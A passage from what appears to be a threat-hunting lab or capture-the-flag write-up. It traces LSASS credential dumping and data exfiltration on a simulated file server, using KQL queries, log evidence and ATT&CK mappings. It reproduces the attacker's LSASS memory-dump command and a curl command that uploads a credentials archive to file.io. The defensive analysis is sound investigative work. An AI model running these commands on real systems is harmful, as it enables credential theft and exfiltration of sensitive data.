
Resulting dump file:
```
DeviceFileEvents
| where FileName == "lsass.dmp"
| where FolderPath contains @"C:\Windows\Logs\CBS"
| project Timestamp, DeviceName, AccountName, ActionType, FolderPath
```
### Evidence Observed

<img width="432" height="93" alt="image" src="https://github.com/user-attachments/assets/adf403f8-7223-4ab1-94e6-12047ecd3103" />

<img width="298" height="117" alt="image" src="https://github.com/user-attachments/assets/1405754f-bbdf-46ea-b699-92dfce256c7e" />


The attacker executed `pd.exe` with flags consistent with Sysinternals-style tools:
```
Process Execution (from ProcessEvents)
Command:
"pd.exe" -accepteula -ma 876 C:\Windows\Logs\CBS\lsass.dmp
Device: azuki-fileserver01
Account: fileadmin
```
Shortly afterward, a file was created:
```
File Creation (from FileEvents)
File: lsass.dmp
Path: C:\Windows\Logs\CBS\lsass.dmp
ActionType: FileCreated
Device: azuki-fileserver01
```
The `-ma` flag indicates a full memory dump, and `876` corresponds to the LSASS process ID at that time.

### Analysis & Interpretation

This confirms:

- `pd.exe` was used as a credential dumping tool
- The target process was LSASS — the core Windows authentication component
- Output was saved directly into the hidden staging directory alongside other stolen data

Dumping LSASS enables extraction of:

- Password hashes
- Kerberos tickets
- Cached interactive logons
- Service account secrets

This gives the attacker deep lateral movement capability beyond this single host.

### Why This Matters

This is one of the highest-severity events in the entire intrusion:

- Grants attacker domain-wide access if privileged creds are present
- Supports long-term persistence, even if initial footholds are cleaned up
- Provides material for offline cracking and replay attacks

In a real environment, this would trigger immediate incident escalation.

### MITRE ATT&CK Mapping

| Technique Category | Technique                           | ID            |
| ------------------ | ----------------------------------- | ------------- |
| Credential Access  | OS Credential Dumping: LSASS Memory | **T1003.001** |

### Final Flag Answer
`"pd.exe" -accepteula -ma 876 C:\Windows\Logs\CBS\lsass.dmp `

---

## FLAG 16 — EXFILTRATION: Upload Command

### Objective

Identify the full command line used to upload the stolen data archive to an external cloud service.

🔍 Investigation Approach

After creating:

- `credentials.tar.gz` (Flag 13)
- `lsass.dmp` with harvested credentials (Flag 15)

…the attacker needed to transfer the data outside the corporate network.

We searched:

- `DeviceProcessEvents`
- For known outbound HTTP-capable LOLbins

Prime candidate: `curl.exe`

We filtered for:

- `-F` (form upload)
- `@` prefix (file attachment)
- HTTPS remote host
- CBS staging directory path

### Query Used

(clear and concise format for reporting)
```
DeviceProcessEvents
| where DeviceName == "azuki-fileserver01"
| where FileName =~ "curl.exe"
| project Timestamp, DeviceName, AccountName, ProcessCommandLine
| order by Timestamp asc
```
### Evidence Observed

The following command was executed to upload the compressed archive:

<img width="482" height="87" alt="image" src="https://github.com/user-attachments/assets/fbe63bde-7f6a-4ec9-bbcb-2fc6aec375d5" />


```
Nov 22, 2025 2:06:08 AM
Device: azuki-fileserver01
Account: fileadmin
Command:
"curl.exe" -F file=@C:\Windows\Logs\CBS\credentials.tar.gz https://file.io
```
This behavior confirms Exfiltration to a cloud storage provider.

### Analysis & Interpretation

This event shows:

- Use of HTTPS to encrypt contents in transit
- A free, anonymous, disposable hosting service (`file.io`)
- Use of form-based file upload to mimic legitimate traffic
- Clear indicator of data exfil completed

Once data reaches file.io:

- Files are available to attacker from anywhere globally
- The org loses immediate control of stolen data

### Why This Matters

This is the breach objective:

- Confidential data & credentials left the environment
- Regulatory, financial, and business harm are now realized
- Attack escalation from reconnaissance → impact

Detection here is critical for timely incident response.

### MITRE ATT&CK Mapping

| Technique Category            | Technique                     | ID                     |
| ----------------------------- | ----------------------------- | ---------------------- |
| Exfiltration                  | Exfiltration Over Web Service | **T1567**              |
| Credential Access → Follow-up | Transfer of Stolen Secrets    | **(related to T1003)** |


### Final Flag Answer

`"curl.exe" -F file=@C:\Windows\Logs\CBS\credentials.tar.gz https://file.io`

---

## 
